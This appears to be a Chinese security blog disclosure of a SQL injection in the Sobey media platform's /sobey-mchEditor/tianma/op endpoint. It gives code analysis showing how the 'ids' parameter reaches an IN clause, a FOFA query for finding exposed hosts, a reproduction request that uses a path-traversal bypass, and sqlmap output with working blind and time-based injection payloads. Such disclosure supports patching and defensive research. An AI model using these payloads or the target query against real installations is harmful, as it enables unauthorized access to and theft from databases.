---
title: "索贝融媒体 /sobey-mchEditor/tianma/op SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-tianma-op-ids-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditortianmaop-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/tianma/op SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/17 08:18
- 725浏览
- [0评论](#comment)
- 31分钟阅读

深入探索

安全运维咨询

漏洞修复方案

服务器安全服务

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/tianma/op 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

# 影响版本

# fofa语法

> app="SOBEY-融媒体"

# 漏洞分析

看下存在漏洞的`op`方法是如何实现的吧

```
@RequestMapping({"/op"})
public Response getColumns(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("ids") String ids, @RequestParam("opstatus") String opstatus, @RequestParam(value = "ifSetField",required = false,defaultValue = "true") Boolean ifSetField) {
    if (StringUtils.isEmpty(ids)) {
        return Response.paramError("所选稿件不能为空");
    } else {
        String opName = this.getOpName(opstatus);
        if (StringUtils.isEmpty(opName)) {
            return Response.paramError("操作未识别");
        } else {
            List<String> articleids = Arrays.asList(ids.split(","));
            QueryBuilder queryBuilder = new QueryBuilder("SELECT a.id ,c.prop1 FROM zccatalog c INNER JOIN zcnarticle a on a.catalogid =  c.id where 1=1 and c.prop1 like '%\\\"tianmaApiUrl\\\"%' ");
            SchemaSQLUtil.appendInCondition(queryBuilder, "a.id", articleids);
            List<Map<String, Object>> rows = queryBuilder.executeAliasListMap();
```

深入探索

企业安全咨询

传输层安全性协议

编码转换工具

安全研究报告

文件大小转换

网络安全培训

恶意软件分析工具

Docker加速服务

SQL

参数 ids 使用逗号分割后的数组`articleids`被带入`appendInCondition`方法中

```
public static <T> void appendInCondition(QueryBuilder queryBuilder, String colomnName, Collection<T> values) {
    StringBuffer sqlbuffer = new StringBuffer(queryBuilder.getSQL());
    appendInCondition(sqlbuffer, colomnName, values);
    queryBuilder.setSQL(sqlbuffer.toString());
}
```

然后又被带入`appendInCondition`方法中

```
public static <T> void appendInCondition(StringBuffer sqlbuffer, String colomnName, Collection<T> values) {
    appendInCondition(sqlbuffer, colomnName, values, false);
}

public static <T> void appendInCondition(StringBuffer sqlbuffer, String colomnName, Collection<T> values, boolean or) {
    if (!or) {
        sqlbuffer.append(String.format(" and %s in (", colomnName));
    } else {
        sqlbuffer.append(String.format(" or %s in (", colomnName));
    }

    int num = values.size();

    for(T value : values) {
        sqlbuffer.append(String.format(" '%s' ", value.toString()));
        --num;
        if (num > 0) {
            sqlbuffer.append(",");
        }
    }

    sqlbuffer.append(") ");
}
```

到这里就很清楚明了了，**ids**经过一些列的分割传参后，是被直接拼接在in子语句中，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，由于 **ids** 参数被逗号分割处理，且每个部分被单引号包围并插入到 IN 子句中，因此注入 `payload` 必须作为一个单一值（无逗号），通过闭合引号和括号来 `breakout`，然后添加延时条件，最后使用注释符屏蔽剩余部分。

# 漏洞复现

```
POST /sobey-mchEditor/js/%2e%2e/tianma/op HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

opstatus=up&siteCode=1&token=1&ids=1')SQLI_POC-- -
```

[![索贝融媒体 /sobey-mchEditor/tianma/op SQL注入漏洞](images/img-001-cad7527f278d.webp)](https://image.mrxn.net/6a579ece79614155bb97ec5719948c9a.webp)

成功延时 5 秒

[SQLMAP](https://mrxn.net/tag/sqlmap)结果如下

```
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: opstatus=up&siteCode=1&token=1&ids=1') OR NOT 2685=2685#

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: opstatus=up&siteCode=1&token=1&ids=1') OR (SELECT 8771 FROM (SELECT(SLEEP(5)))WWVB)-- QTWL
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#sqlmap](https://mrxn.net/tag/sqlmap)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
